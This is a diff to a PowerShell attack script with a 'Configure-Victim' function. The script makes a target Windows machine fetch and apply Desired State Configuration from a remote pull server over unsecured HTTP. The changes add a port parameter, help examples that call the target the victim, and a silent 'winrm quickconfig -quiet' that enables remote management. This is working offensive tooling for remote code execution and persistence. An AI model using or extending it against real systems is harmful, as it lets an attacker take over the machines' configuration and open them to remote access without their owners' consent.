@@ -19,7 +19,8 @@ Metwork address of the remote DSC server
 
 .PARAMETER MofPath
 
-Optional parameter of the temporary MOF file location. If  parameter is not supplied the file is written to C:\Windows\System32\Configuration\PullConfig.mof then deleted.
+Optional parameter of the temporary MOF file location. 
+If  parameter is not supplied the file is written to C:\Windows\System32\Configuration\PullConfig.mof then deleted.
 
 
 .EXAMPLE
@@ -37,8 +38,20 @@ PS C:\> Configure-Victim -GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d -Server 8.8.
 Description
 -----------
 
-Same functionality as prior example example temporary mof file is written to 'C:\Temp\Temp.mof'.
+Victim downloads configuration with GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d from the server at 8.8.8.8.
+Optional parameter 'MofPath' determines temporary mof file is written to 'C:\Temp\Temp.mof'.
 Note: In both cases the mof file is temporary and deleted before script terminates.
+
+.EXAMPLE
+
+PS C:\> Configure-Victim -GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d -Server 8.8.8.8 -Port 443
+
+Description
+-----------
+
+Victim downloads configuration with GUID 1505960a-99f1-41fa-9c9f-50b4b56c2a0d from the server at 8.8.8.8.
+Optional 'port' parameter determines the remote port where configuration is hosted
+Note: If 'port' parameter is not used the default port is 8080
 
 
 #>
@@ -54,7 +67,10 @@ Note: In both cases the mof file is temporary and deleted before script terminat
 
         [Parameter(Mandatory = $False)]
         [ValidatePattern('\.mof$')]
-        [String] $MofPath = "C:\Windows\System32\Configuration\PullConfig.mof"
+        [String] $MofPath = "C:\Windows\System32\Configuration\PullConfig.mof",
+
+        [Parameter(Mandatory = $False)]
+        [String] $Port = "8080"
 
 
 
@@ -77,12 +93,14 @@ Note: In both cases the mof file is temporary and deleted before script terminat
             RebootNodeIfNeeded = $False
             RefreshMode = 'Pull'
             DownloadManagerName = 'WebDownloadManager'
-            DownloadManagerCustomData = (@{ServerUrl = "http://${PullServer}:8080/psdscpullserver.svc"; 
+            DownloadManagerCustomData = (@{ServerUrl = "http://${PullServer}:${Port}/psdscpullserver.svc"; 
                                             AllowUnsecureConnection = “TRUE”})
          
         }
     }
  
+    winrm quickconfig -quiet
+
     Write-Host "Generating pull server configuration"
  
     ConfigurePullServer -NodeId $GUID -PullServer $Server -OutputPath $MOFPath 
